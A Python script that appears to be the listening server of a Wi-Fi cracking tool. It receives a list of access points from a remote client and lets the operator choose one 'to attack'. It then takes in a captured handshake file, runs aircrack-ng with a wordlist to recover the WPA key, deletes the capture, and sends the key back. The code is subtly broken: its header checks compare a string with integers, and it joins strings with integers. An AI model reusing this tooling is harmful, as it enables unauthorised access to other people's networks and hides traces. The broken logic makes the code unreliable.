import socket
import os
import subprocess
import tqdm


def bToString(arg):
    return ''.join(map(chr, arg))


def breakKey():
    cracking = subprocess.run(
        ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", "handshake-01.cap"],
        shell=True, stdout=subprocess.PIPE)
    cracking.stdout = bToString(cracking.stdout)
    if cracking.stdout.__contains__("KEY FOUND"):
        key = open("password").readline()
        print("Key found:", key)
        # delete .cap file
        subprocess.run(["del", "handshake-01.cap"], shell=True)
        # send key back
        return key
    else:
        return None


HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

s = socket.socket()
s.bind((HOST, PORT))
s.listen(5)
print(f"[*] Listening as {HOST}:{PORT}")

client_socket, client_address = s.accept()
print(f"[+] {client_address} is connected.")

receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
headerCode, headerMessage = receivedHeader.split(SEPARATOR)
if headerCode == 1:
    for i in range (0,len(headerMessage)):
        print("["+i+"] :: "+headerMessage[i])
    index = input("select the numeric value for the AP you wish to attack: ")
    client_socket.sendall(bytes(index, 'utf-8'))

elif headerCode == 2:
    received = client_socket.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:
                # nothing is received
                # file transmitting is done
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            progress.update(len(bytes_read))
        print("File received")
        pass

    key = breakKey()
    if key is None:
        print("No key extracted")
    else:
        client_socket.sendall(bytes(key, 'utf-8'))
        client_socket.close()

# close the server socket
s.close()
